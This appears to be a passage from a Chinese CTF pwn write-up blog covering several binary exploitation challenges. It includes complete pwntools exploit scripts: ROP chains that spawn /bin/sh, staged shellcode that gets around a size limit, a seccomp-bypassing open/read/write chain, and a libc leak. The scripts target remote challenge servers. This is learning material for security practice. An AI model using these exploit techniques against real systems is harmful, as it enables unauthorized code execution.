+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ./pwn --string &quot;/bin/sh&quot;  <br>search /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>均无，sh没试过后续可以试试研究一下（一开始试了但是是用错误的int 0x80试的，没成功）</p>
+<p>考虑用read写入在execute</p>
+<p>read：32位：3，64位：0</p>
+<p>execute：32位：11，64位：59</p>
+<p>查找gadget</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary ./pwn --only &quot;pop|ret&quot; | grep &quot;eax&quot;<br>ROPgadget --binary ./pwn --only &quot;pop|ret&quot; | grep &quot;ebx&quot; <br>ROPgadget --binary ./pwn --only &quot;pop|ret&quot; | grep &quot;ecx&quot; <br>ROPgadget --binary ./pwn --only &quot;pop|ret&quot; | grep &quot;edx&quot; <br>ROPgadget --binary ./pwn --only | grep &quot;int 0x80&quot; <br></code></pre></td></tr></table></figure>
+
+<p>vmmap查找data段用于后续写入&#x2F;bin&#x2F;sh</p>
+<p>构造payload</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell">buf = 0x80ef000-0x1e<br><br>from pwn import *<br>context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;8.147.132.32&#x27;,23982)<br>p.recvuntil(&#x27;pwn it guys!&#x27;)<br><br>offset = 22<br>payload = b&#x27;a&#x27;*offset<br><br>pop_eax_ret = 0x080b438a<br>pop_ebx_ret = 0x08049022<br>pop_ecx_ret = 0x0804985a <br>pop_edx_ret = 0x0804985c <br><span class="hljs-meta prompt_">#</span><span class="language-bash">int_0x80 = 0x08049c0a</span><br>int_0x80 =0x080739ff <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">read</span></span><br>payload += p32(pop_ebx_ret) + p32(0) + p32(pop_ecx_ret)  + p32(buf) +p32(pop_edx_ret)+p32(8)<br>payload += p32(pop_eax_ret) + p32(3)<br>payload += p32(int_0x80)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,0,0)</span><br>payload += p32(pop_ebx_ret) + p32(buf) + p32(pop_ecx_ret)  + p32(0) +p32(pop_edx_ret)+p32(0)<br>payload += p32(pop_eax_ret) + p32(0xb)<br>payload += p32(int_0x80)<br><br>p.send(payload)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br>p.send(&quot;/bin/sh&quot;)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<p>有一个致命的错误</p>
+<p>里面有一个看似很干净的int 0x80，但实际上这个并不能用，我最后选的是xol ；int 0x80好像，这个就可以通。</p>
+<p>倘若用前一个的地址，程序会进入死循环，一开始迷惑了我eax不是0xb以为没写进去，实则是程序执行完报错了后eax返回为一个-4还是啥来着。</p>
+<p>但也算一次好的经验，要习惯性多调试，而且对于ai的回答一定不能全信，它是基于固定信息环境下的，而真实情况千变万化，这里就没有检查到int 0x80的错误。</p>
+<h1 id="9-input-small-function"><a href="#9-input-small-function" class="headerlink" title="9.input_small_function"></a>9.input_small_function</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760058325195-55428f2f-7d4e-42a0-bb30-ea7d9bf401d1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760058341490-56673d20-cd75-4a9f-ad3e-be9c49eebe58.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>只有canary没开，但是程序伪代码显示给了我们内存空间执行权限，而且可以写入</p>
+<p>但是有限制，只能20字节</p>
+<p>正常shellcode字节长度超过20字节</p>
+<p>但是可以看到可执行权限内存很大，所以我想能不能read写入到这个可执行，再跳转到它执行</p>
+<p>实践成功</p>
+<p>exp如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br><br>p = remote(&#x27;8.147.132.32&#x27;,35389)<br><br>context.arch = &#x27;amd64&#x27;<br>context.log_level = &#x27;debug&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">第一阶段: <span class="hljs-built_in">read</span> Shellcode (15字节)</span><br>stage1 = asm(&#x27;&#x27;&#x27;<br>    push 0x114530<br>    pop rsi<br>    xor eax, eax<br>    cdq<br>    mov dh, 0x1<br>    syscall<br>    jmp rsi<br>&#x27;&#x27;&#x27;)<br><br>print(f&quot;Stage1 长度: &#123;len(stage1)&#125; 字节&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">第二阶段: 真正的 Shellcode (如 /bin/sh)</span><br>stage2 = asm(shellcraft.amd64.sh())<br>print(f&quot;Stage2 长度: &#123;len(stage2)&#125; 字节&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">发送第一阶段</span><br>p.send(stage1.ljust(0x14, b&#x27;\x00&#x27;))  # 用nop填充到20字节<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">发送第二阶段</span><br>sleep(0.1)<br>p.send(stage2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="10-noshell"><a href="#10-noshell" class="headerlink" title="10.noshell"></a>10.noshell</h1><p>记住要先认真审题，这次没有认真审题直接开做导致一直想覆盖返回地址为system不知道为什么不可以</p>
+<p>在IDA可以看看左边函数可能有某些暗示，比如此题有一些暗示的tools给我们</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1760066619310-9e2c1324-f87b-4dbc-96c2-8f9b7c8b4002.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>根据代码审计，先输入y，3就可以进入challenge（）</p>
+<p>在challenge里可以猜测漏洞应该在这个函数里</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">void __noreturn challenge()<br>&#123;<br>  int v0; // [rsp+Ch] [rbp-4h] BYREF<br><br>  while ( 1 )<br>  &#123;<br>    write(1, &quot;Welcome to the challenge!\n&quot;, 0x1Au);<br>    write(1, &quot;Please Make choice:\n&quot;, 0x14u);<br>    write(1, &quot;1. Check your power\n&quot;, 0x14u);<br>    write(1, &quot;2. Get the power of your cat\n&quot;, 0x18u);<br>    write(1, &quot;3. Open the door\n&quot;, 0x11u);<br>    write(1, &quot;4. Destroy this world\n&quot;, 0x16u);<br>    write(1, &quot;5. leave this world\n&quot;, 0x14u);<br>    write(1, &quot;your choice: &quot;, 0xDu);<br>    __isoc99_scanf(&quot;%d&quot;, &amp;v0);<br>    switch ( v0 )<br>    &#123;<br>      case 1:<br>        Check_your_power();<br>        break;<br>      case 2:<br>        Get_the_power_of_your_cat();<br>        break;<br>      case 3:<br>        open_the_door();<br>        break;<br>      case 4:<br>        destroy_this_world();<br>        break;<br>      case 5:<br>        write(1, &quot;Goodbye!\n&quot;, 9u);<br>        exit(0);<br>      default:<br>        write(1, &quot;Invalid choice!\n&quot;, 0x10u);<br>        break;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>1里有一个栈溢出漏洞，但是要先经过2改变off的变量</p>
+<p>3是有一个shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">int open_the_door()<br>&#123;<br>  int fd; // [rsp+Ch] [rbp-4h]<br><br>  fd = open(&quot;flag.txt&quot;, 0);<br>  close(fd);<br>  return puts(&quot;The door is closed!&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>根据题目提示以及sandbox函数，可以知道有沙盒保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">__int64 sandbox()<br>&#123;<br>  __int64 v1; // [rsp+8h] [rbp-8h]<br><br>  v1 = seccomp_init(2147418112);<br>  if ( !v1 )<br>    exit(1);<br>  seccomp_rule_add(v1, 0, 59, 0);<br>  if ( (int)seccomp_load(v1) &lt; 0 )<br>  &#123;<br>    seccomp_release(v1);<br>    exit(1);<br>  &#125;<br>  return seccomp_release(v1);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>进入destroy_this_world();尝试一下发现确实不能getshell</p>
+<p>查看沙盒保护禁掉了哪些系统调用<code>seccomp-tools dump ./pwn</code></p>
+<p>发现只禁掉了system的而已，所以不影响我们getshell，我们只需要调用open，read，write三个函数来打印出flag里的内容就可以了</p>
+<p>有个注意点，要用elf.plt[open],由于动态链接，所以要先调用一次，所以程序要走一次3的内容</p>
+<p>另一个注意点，我单方面以为flag.txt也能读取，但是flag.txt与flag不一样，而ctf里一般是flag，所以要找flag的字符串，不能用flag.txt</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)<br>p = process(&quot;./pwn&quot;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>,18595)</span><br>elf =ELF(&#x27;./pwn&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">进入challenge</span><br>p.recvuntil(&#x27;Do you want to say something?&#x27;)<br>p.sendline(b&#x27;y&#x27;)<br>p.recvuntil(&#x27;flag?&#x27;)<br>p.sendline(b&#x27;3&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">challenge</span><br>p.recvuntil(&#x27;your choice: &#x27;)<br>p.sendline(b&#x27;3&#x27;)<br>p.recvuntil(&#x27;your choice: &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;your choice: &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;say something:&#x27;)<br><br>nop_ret =0x40126f<br>open_plt = elf.plt[&#x27;open&#x27;]<br>read_plt = elf.plt[&#x27;read&#x27;] <br>write_plt = elf.plt[&#x27;write&#x27;]<br>print(open_plt)<br>print(read_plt)<br>print(write_plt)<br>data_addr = 0x405000-0x100<br><br>pop_rdi = 0x4013f3        # pop rdi ; ret<br>pop_rsi = 0x4013f5        # pop rsi  ret  <br>pop_rdx = 0x4013f7        # pop rdx ; ret (需要实际查找)<br>move_rdi_rax = 0x4013f9<br>flag_str = 0x402034<br><br>payload = b&#x27;a&#x27;*40 + p64(0x40126f) <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">1. open(<span class="hljs-string">&quot;flag&quot;</span>, 0) - 以只读方式打开文件</span><br>payload += p64(pop_rdi) + p64(flag_str)  # 参数1: 文件名<br>payload += p64(pop_rsi) + p64(0)         # 参数2: 标志位(0=O_RDONLY)<br>payload += p64(open_plt)                 # 调用open，返回值fd在rax中<br>    <br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. <span class="hljs-built_in">read</span>(fd, buf, size) - 读取文件内容</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">注意：这里假设open返回的fd=3，实际情况可能需要调整</span><br>payload += p64(move_rdi_rax)        <br>payload += p64(pop_rsi) + p64(data_addr)  # 参数2: 缓冲区地址(BSS段)<br>payload += p64(pop_rdx) + p64(100)       # 参数3: 读取大小<br>payload += p64(read_plt)                 # 调用read<br>    <br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. write(1, buf, size) - 输出到标准输出</span><br>payload += p64(pop_rdi) + p64(1)         # 参数1: 文件描述符(1=stdout)<br>payload += p64(pop_rsi) + p64(data_addr)  # 参数2: 缓冲区地址<br>payload += p64(pop_rdx) + p64(100)       # 参数3: 写入大小<br>payload += p64(write_plt) <br><br>gdb.attach(p)<br>p.sendline(payload)<br>    <br><span class="hljs-meta prompt_"># </span><span class="language-bash">接收flag</span><br>flag_data = p.recv(timeout=1)<br>print(&quot;Flag data:&quot;, flag_data)<br>    <br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="11-calc-meow"><a href="#11-calc-meow" class="headerlink" title="11.calc_meow"></a>11.calc_meow</h1><p>和之前那道题一样，没有检查0，可以覆盖返回地址和栈布局</p>
+<p>但是题目所有保护都开了，pie也开了，所以得泄露pie再进行其他libc泄露等</p>
+<p>因为0保存的是返回地址，所以通过calc的计算以及返回地址的偏移量可以计算出基地址</p>
+<p>计算基地址后构造puts[puts@got]可以泄露libc基地址，接收后返回main</p>
+<p>回到main后栈清零了，此时直接按上周那题栈布局system（&#x2F;bin&#x2F;sh）即可</p>
+<p>这里为了方便我直接找libc里的pop_rdi；ret</p>
+<p>ps：注意栈对齐</p>
+<p>exp：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br>context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)</span><br>p = remote(&#x27;8.147.132.32&#x27;,29489)<br>elf = ELF(&#x27;./pwn&#x27;)<br>libc = ELF(&#x27;./libc.so.6&#x27;)<br><br>zhan_addr = &quot;0x1cda&quot;<br>zhan_addr = int(zhan_addr,16)<br>edit_times = &quot;0x4014&quot;<br>edit_times = int(edit_times,16)<br>puts = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>main = elf.symbols[&#x27;main&#x27;]<br>system = libc.symbols[&#x27;system&#x27;]<br>bin_sh_addr =next(libc.search(b&#x27;/bin/sh&#x27;))<br><br>rdi_ret = &quot;0x1d11&quot;<br>rdi_ret = int(rdi_ret,16)<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(zhan_addr).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;15&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(puts_got).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;14&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(puts).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;13&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(main).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;12&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(rdi_ret).encode())<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">泄露基址，栈布局打印puts(puts_got)+返回地址，编辑控制返回地址</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">1为返回地址</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;4&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;0&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">16为基地址</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">1为puts_got</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;15&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">2为puts</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;14&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">3为main</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;13&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;3&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">0为rdi_ret</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;16&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;12&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;0&#x27;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">触发ROP</span><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;6&#x27;)<br><br><br>puts_libc = p.recvline().strip()<br>puts_libc = u64(puts_libc.ljust(8,b&#x27;\x00&#x27;))<br>libc_base = puts_libc - libc.symbols[&#x27;puts&#x27;]<br>print(libc_base)<br>print(hex(libc_base))<br>rdi_libc = libc_base + 0x2a3e5<br>print(hex(rdi_libc))<br>system_addr = libc_base + libc.symbols[&#x27;system&#x27;]<br>print(hex(system_addr))<br>bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))<br>print(hex(bin_sh_addr))<br>ret = libc_base + 0x29139<br>one_gadget = libc_base + 0xebc85<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">gdb.attach(p)</span><br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;1&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(bin_sh_addr).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;3&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(system_addr).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(ret).encode())<br><br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;2&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(b&#x27;0&#x27;)<br>p.recvuntil(&#x27;&gt; &#x27;)<br>p.sendline(str(rdi_libc).encode())<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="12-fmt-and-canary"><a href="#12-fmt-and-canary" class="headerlink" title="12.fmt and canary"></a>12.fmt and canary</h1><p>之前写好了，但是就是不知道哪里有误</p>
+<p>如今重新调试，发现问题在libc基地址，可以是%33p泄露的时候泄露的数据基地址不能按正常算</p>
